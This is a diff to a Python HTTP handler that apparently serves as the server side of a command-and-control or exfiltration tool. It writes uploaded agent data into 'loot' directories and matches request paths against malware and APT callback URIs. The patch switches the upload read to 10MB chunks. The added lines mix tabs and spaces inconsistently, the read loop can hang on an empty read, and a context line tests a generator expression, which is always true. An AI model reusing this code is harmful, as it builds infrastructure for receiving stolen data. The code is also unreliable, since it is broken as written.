@@ -133,6 +133,7 @@ class GetHandler(BaseHTTPRequestHandler):
             self.send_response(200)
             self.end_headers()
             mode = 'wb'
+            chunk_size = 10000000 # 10MB chunks
 
             # Check to make sure the agent directory exists, and a loot
             # directory for the agent.  If not, make them
@@ -142,12 +143,16 @@ class GetHandler(BaseHTTPRequestHandler):
             length = self.headers['content-length']
             filename = self.headers['Filename']
             append = self.headers.get('Append')
-            data = self.rfile.read(int(length))
+            read_bytes = 0
+
             if append:
                 mode = 'ab'
-
             with open(loot_path + filename, mode) as cc_data_file:
-                cc_data_file.write(data)
+                while read_bytes < int(length):
+                    data = self.rfile.read(chunk_size)
+		    read_bytes += len(data)
+		    print("[*] {} - Read {} bytes of {}...".format(filename, read_bytes, length))
+                    cc_data_file.write(data)
 
         elif (self.path in malware_callbacks.malware_uris) or (self.path.startswith(other_uri) for other_uri in malware_callbacks.other_apt_uris):
 
